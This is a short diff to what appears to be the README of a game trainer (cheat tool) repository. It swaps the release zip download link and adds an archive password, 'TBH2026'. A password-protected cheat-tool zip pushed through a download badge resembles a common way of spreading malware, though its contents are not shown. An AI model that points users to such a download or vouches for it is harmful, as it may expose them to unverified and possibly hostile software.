@@ -61,11 +61,12 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/Cubearshackle/TBH-Ultimate-Trainer/releases/download/5/TBHUltimate2.zip">
+  <a href="https://github.com/Cubearshackle/TBH-Ultimate-Trainer/releases/download/6/TBHUltimate.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
 
+## Password: TBH2026
 ---
 
 ## 🛡️ Important Warning
